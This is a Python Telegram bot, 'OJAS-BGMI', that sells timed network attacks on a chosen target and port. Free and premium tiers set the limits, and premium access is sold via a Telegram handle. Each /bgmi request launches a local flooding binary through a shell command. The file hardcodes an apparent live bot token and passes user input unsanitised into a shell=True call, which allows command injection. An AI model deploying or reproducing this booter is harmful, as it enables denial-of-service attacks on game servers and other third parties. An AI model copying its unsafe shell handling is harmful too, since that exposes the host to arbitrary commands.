import telebot
import subprocess
import time
import threading
from keep_alive import keep_alive

# Bot Setup
bot = telebot.TeleBot('8636140344:AAEUh1GNRu7vD9Rby_0dEIkz-dIODPxdsKA')

# 💎 PREMIUM USERS LIST (Add IDs here to make them Premium)
PREMIUM_USERS = ["8116319077"]

keep_alive()

# Memory Dictionaries & Concurrency Controls
user_cooldowns = {}
awaiting_feedback = {}

active_free_attacks = 0
active_premium_attacks = 0
attack_lock = threading.Lock() # To safely count concurrent attacks

# 1. DYNAMIC WELCOME MESSAGE (Free/Premium Check)
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.chat.id)
    
    # Check Tier
    if user_id in PREMIUM_USERS:
        tier_display = "Premium User 💎"
    else:
        tier_display = "Free User 🆓"

    response = f"<b>🌟 WELCOME TO OJAS-BGMI 🌟</b>\n\n"
    response += f"👤 <b>User:</b> {user_name}\n"
    response += f"⚡ <b>Status:</b> <code>Online ✅</code>\n"
    response += f"🛡️ <b>Access:</b> <code>{tier_display}</code>\n\n"
    response += f"<i>Use /help to see all available commands.</i>"
    bot.reply_to(message, response, parse_mode='HTML')

# 2. PREMIUM HELP MESSAGE
@bot.message_handler(commands=['help'])
def help_command(message):
    response = "<b>🚀 OJASBGMI Commands:</b>\n\n"
    response += "🗡️ <b>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</b> - Start Attack\n"
    response += "📊 <b>/myinfo</b> - Check your status\n"
    response += "\n💎 <b>Premium Perks:</b> Max 600s attack & 2 concurrent slots!"
    bot.reply_to(message, response, parse_mode='HTML')

# 3. PREMIUM INFO MESSAGE
@bot.message_handler(commands=['myinfo'])
def info(message):
    user_id = str(message.chat.id)
    tier = "Premium 💎" if user_id in PREMIUM_USERS else "Free 🆓"
    response = f"👤 <b>User:</b> {message.from_user.first_name}\n🆔 <b>ID:</b> <code>{user_id}</code>\n🛡️ <b>Plan:</b> {tier}"
    bot.reply_to(message, response, parse_mode='HTML')

# 4. FEEDBACK HANDLER (Photo check)
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.chat.id)
    if awaiting_feedback.get(user_id, False):
        awaiting_feedback[user_id] = False
        bot.reply_to(message, "✅ <b>Feedback accepted! You can now launch your next attack.</b>", parse_mode='HTML')

# 5. BACKGROUND ATTACK PROCESS (Smooth Progress Bar)
def process_attack(target, port, duration, chat_id, sent_msg_id, user_name, user_tier, user_id):
    global active_free_attacks, active_premium_attacks
    
    # Start actual attack
    subprocess.Popen(f"./bgmi {target} {port} {duration} 500", shell=True)
    
    start_time = time.time()
    update_count = 0
    
    # Smooth Progress Bar Loop (Updates every 3 seconds)
    while True:
        elapsed = int(time.time() - start_time)
        if elapsed >= duration:
            break
            
        update_count += 1
        remaining = max(0, duration - elapsed)
        progress = min(100, int((elapsed / duration) * 100))
        
        blocks = int(progress / 10)
        bar = "█" * blocks + "░" * (10 - blocks)
        
        new_text = f"🚀 <b>ATTACK IN PROGRESS</b> 🚀\n\n"
        new_text += f"📌 <b>Target:</b> <code>{target}:{port}</code>\n"
        new_text += f"⏱️ <b>Duration:</b> {duration} seconds\n"
        new_text += f"📊 <b>Progress:</b> [{bar}] {progress}%\n"
        new_text += f"⏳ <b>Elapsed:</b> {elapsed}s\n📉 <b>Remaining:</b> {remaining}s\n"
        new_text += f"👤 <b>Launched by:</b> {user_name}\n"
        new_text += f"💎 <b>Tier:</b> {user_tier.capitalize()}\n"
        new_text += f"🟢 <b>Status:</b> Running\n"
        new_text += f"🆔 <b>Update:</b> #{update_count}"
        
        try:
            bot.edit_message_text(new_text, chat_id, sent_msg_id, parse_mode='HTML')
        except Exception:
            pass # Ignore Telegram rate limits
            
        time.sleep(3) # Faster and smoother updates
        
    # Attack Finished - Free Up Server Slots
    with attack_lock:
        if user_tier == 'free':
            active_free_attacks -= 1
        else:
            active_premium_attacks -= 1

    # Final Message & Enable Feedback Lock
    bot.send_message(chat_id, "✅ <b>Attack Finished!</b>\n\n⚠️ <i>Please send a feedback screenshot to unlock your next attack.</i>", parse_mode='HTML')
    user_cooldowns[user_id] = time.time()
    awaiting_feedback[user_id] = True


# 6. TITAN-STYLE ATTACK COMMAND (With Limits & Concurrency)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global active_free_attacks, active_premium_attacks
    
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name
    user_tier = "premium" if user_id in PREMIUM_USERS else "free"

    # Check Feedback Lock
    if awaiting_feedback.get(user_id, False):
        bot.reply_to(message, "⚠️ <b>You must send a feedback photo before your next attack!</b>\n<i>Please send any screenshot/photo as feedback.</i>", parse_mode='HTML')
        return

    # Check Anti-Spam Cooldown
    if user_id in user_cooldowns:
        time_since_last = time.time() - user_cooldowns[user_id]
        if time_since_last < 30: # 30 Seconds Cooldown
            remaining_cd = int(30 - time_since_last)
            bot.reply_to(message, f"⏳ <b>Cooldown active! Wait {remaining_cd}s before next attack.</b>", parse_mode='HTML')
            return

    # Parse Command
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "<b>Usage:</b> <code>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</code>", parse_mode='HTML')
        return

    target, port = command[1], command[2]
    try:
        duration = int(command[3])
    except ValueError:
        bot.reply_to(message, "⚠️ <b>Time must be an integer!</b>", parse_mode='HTML')
        return

    # TIER BASED DURATION LIMITS
    if user_tier == "free" and duration > 60:
        bot.reply_to(message, "⚠️ <b>FREE PLAN LIMIT EXCEEDED!</b>\n\nFree users can only attack for up to 60 seconds. <b>Purchase Premium</b> to attack up to 600 seconds! DM @mesh213", parse_mode='HTML')
        return
    elif user_tier == "premium" and duration > 600:
        bot.reply_to(message, "⚠️ <b>MAX LIMIT EXCEEDED!</b>\nPremium users can attack for a maximum of 600 seconds.", parse_mode='HTML')
        return

    # CONCURRENCY CONTROL (Max 1 Free, Max 2 Premium)
    with attack_lock:
        if user_tier == "free":
            if active_free_attacks >= 1:
                bot.reply_to(message, "⚠️ <b>FREE SERVER BUSY!</b> ⚠️\n\nAnother free user is currently attacking. Please wait for their attack to finish or <b>Purchase Premium</b> to skip the line! DM @mesh213", parse_mode='HTML')
                return
            active_free_attacks += 1
        else:
            if active_premium_attacks >= 2:
                bot.reply_to(message, "⚠️ <b>PREMIUM SERVERS FULL!</b>\n\nBoth premium slots are currently in use. Please wait a few seconds.", parse_mode='HTML')
                return
            active_premium_attacks += 1

    # Send Initial Message
    sent_msg = bot.send_message(message.chat.id, "🚀 <b>INITIALIZING ATTACK...</b> 🚀", parse_mode='HTML')

    # Start Attack in Background Thread (Keeps bot responsive)
    threading.Thread(target=process_attack, args=(target, port, duration, message.chat.id, sent_msg.message_id, user_name, user_tier, user_id)).start()

bot.polling(none_stop=True)
